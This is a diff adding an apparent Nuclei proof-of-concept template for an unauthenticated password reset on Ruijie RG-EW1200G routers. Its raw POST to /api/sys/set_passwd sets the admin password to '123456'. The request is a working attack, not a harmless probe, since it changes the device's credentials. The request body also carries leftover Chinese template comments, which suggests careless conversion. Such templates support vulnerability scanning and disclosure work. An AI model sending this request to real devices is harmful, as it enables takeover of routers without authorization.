@@ -1,0 +1,57 @@
+id: poc-mnc2rlp8ybnw0hnv
+info:
+  name: 锐捷 RG-EW1200G 未授权任意密码修改
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/mnc2rlp8ybnw0hnv'
+  tags: unauth,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: mnc2rlp8ybnw0hnv
+    fofa: 暂无
+http:
+- raw:
+  - 'POST /api/sys/set_passwd HTTP/1.1
+
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    DNT: 1
+
+
+    Upgrade-Insecure-Requests: 1
+
+
+
+
+    {"username":"admin","admin_new":"123456"}
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
